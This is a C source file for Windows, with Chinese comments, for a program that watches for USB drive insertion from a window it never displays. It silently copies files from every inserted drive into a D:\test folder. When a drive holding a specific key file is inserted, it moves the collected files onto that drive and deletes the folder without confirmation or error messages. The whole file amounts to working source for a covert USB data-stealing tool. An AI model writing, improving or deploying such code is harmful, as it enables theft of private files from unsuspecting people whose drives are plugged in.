#include <windows.h>
#include <stdio.h>
#include <dbt.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

// 回调函数，用于处理设备改变事件
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_DEVICECHANGE) {
        if (wParam == DBT_DEVICEARRIVAL) {
            PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
            if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                printf("检测到插入U盘\n");

                // 获取U盘的盘符
                PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
                char driveLetter = 'A';
                while (lpdbv->dbcv_unitmask >>= 1) {
                    ++driveLetter;
                }

                // 构造U盘根目录路径
                char rootPath[4] = {driveLetter, ':', '\\', '\0'};

                // 检查D盘下的test文件夹是否存在，如果不存在则创建
                char testFolderPath[MAX_PATH] = "D:\\test";
                if (!PathFileExists(testFolderPath)) {
                    CreateDirectory(testFolderPath, NULL);
                }

                // 检查U盘中是否存在指定的文件
                char keyFilePath[MAX_PATH];
                PathCombine(keyFilePath, rootPath, "key_114514.1919810");
                if (PathFileExists(keyFilePath)) {
                    printf("找到文件: key_114514.1919810\n");

                    // 确保U盘的bak文件夹存在
                    char bakFolderPath[MAX_PATH];
                    PathCombine(bakFolderPath, rootPath, "bak");
                    if (!PathFileExists(bakFolderPath)) {
                        CreateDirectory(bakFolderPath, NULL);
                    }

                    // 拷贝D盘test文件夹中的所有文件到U盘的bak文件夹
                    WIN32_FIND_DATA findDataD;
                    char searchPathD[MAX_PATH];
                    PathCombine(searchPathD, testFolderPath, "*.*");
                    HANDLE hFindD = FindFirstFile(searchPathD, &findDataD);
                    if (hFindD != INVALID_HANDLE_VALUE) {
                        do {
                            if (!(findDataD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                char srcPathD[MAX_PATH];
                                char destPathD[MAX_PATH];
                                PathCombine(srcPathD, testFolderPath, findDataD.cFileName);
                                PathCombine(destPathD, bakFolderPath, findDataD.cFileName);
                                if (!CopyFile(srcPathD, destPathD, FALSE)) {
                                    DWORD error = GetLastError();
                                    printf("拷贝文件失败，错误代码: %lu\n", error);
                                }
                            }
                        } while (FindNextFile(hFindD, &findDataD));
                        FindClose(hFindD);
                    }

                    // 删除D盘下的test文件夹
                    SHFILEOPSTRUCT fileOp = {
                        .hwnd = hwnd,
                        .wFunc = FO_DELETE,
                        .pFrom = testFolderPath,
                        .fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT
                    };
                    SHFileOperation(&fileOp);
                } else {
                    printf("未找到文件: key_114514.1919810\n");
                }

                // 定义1GB的大小（以字节为单位）
                #define ONE_GIGABYTE (1024 * 1024 * 1024)

                // 列出U盘内的所有文件并拷贝到D盘的test文件夹
                printf("U盘内的文件列表:\n");
                WIN32_FIND_DATA findData;
                char searchPath[MAX_PATH];
                PathCombine(searchPath, rootPath, "*.*");
                HANDLE hFind = FindFirstFile(searchPath, &findData);
                if (hFind != INVALID_HANDLE_VALUE) {
                    do {
                        if (strcmp(findData.cFileName, "key_114514.1919810") != 0) { // 不拷贝key文件
                            printf("%s\n", findData.cFileName);

                            // 检查文件大小
                            LARGE_INTEGER fileSize;
                            fileSize.LowPart = findData.nFileSizeLow;
                            fileSize.HighPart = findData.nFileSizeHigh;
                            if (fileSize.QuadPart > ONE_GIGABYTE) {
                                printf("文件 %s 大小超过1GB，跳过拷贝。\n", findData.cFileName);
                                continue;
                            }
                            // 拷贝文件到D盘下的test文件夹
                            char srcPath[MAX_PATH];
                            char destPath[MAX_PATH];
                            PathCombine(srcPath, rootPath, findData.cFileName);
                            PathCombine(destPath, testFolderPath, findData.cFileName);
                            if (!CopyFile(srcPath, destPath, FALSE)) {
                                DWORD error =GetLastError();
                                printf("源路径: %s\n", srcPath);
                                printf("目标路径: %s\n", destPath);
                                printf("拷贝文件失败，错误代码: %lu\n", error);
                            }
                        }
                    } while (FindNextFile(hFind, &findData));
                    FindClose(hFind);
                }
            }
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main() {
    // 创建一个隐藏窗口用于接收设备改变消息
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "DeviceDetectionClass";
    RegisterClass(&wc);

    HWND hwnd = CreateWindow("DeviceDetectionClass", "Device Detection Window", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);

    // 进入消息循环，等待设备改变事件
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
